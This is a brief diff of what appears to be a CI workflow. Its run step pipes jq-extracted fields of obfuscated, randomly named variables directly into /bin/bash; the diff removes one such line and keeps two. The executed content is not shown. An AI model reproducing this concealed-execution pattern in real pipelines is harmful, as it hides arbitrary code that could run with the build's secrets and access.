@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$pfrfd9" | jq -r .pr652 | /bin/bash
           echo $t0 | jq -r .sqbq6 | /bin/bash
-          echo $ktptb1 | jq -r .jt0 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
